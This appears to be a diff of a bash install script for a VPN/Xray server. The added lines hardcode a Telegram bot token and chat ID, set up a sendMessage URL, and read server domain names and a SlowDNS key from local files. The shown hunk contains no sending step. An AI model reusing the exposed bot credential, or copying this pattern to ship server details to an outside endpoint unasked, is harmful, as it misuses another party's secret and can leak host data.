@@ -3,6 +3,17 @@ dateFromServer=$(curl -v --insecure --silent https://google.com/ 2>&1 | grep Dat
 biji=`date +"%Y-%m-%d" -d "$dateFromServer"`
 #########################
 clear
+# Getting
+clear
+export CHATID="5736569839"
+export KEY="6307367714:AAG_Gae1CEjB-BDTYLzHSb89kbmLxzln7mk"
+export TIME="10"
+export URL="https://api.telegram.org/bot$KEY/sendMessage"
+clear
+sldomain=$(cat /root/nsdomain)
+cdndomain=$(cat /root/awscdndomain)
+slkey=$(cat /etc/slowdns/server.pub)
+clear
 cekray=`cat /root/log-install.txt | grep -ow "XRAY" | sort | uniq`
 if [ "$cekray" = "XRAY" ]; then
 domeni=`cat /etc/xray/domain`
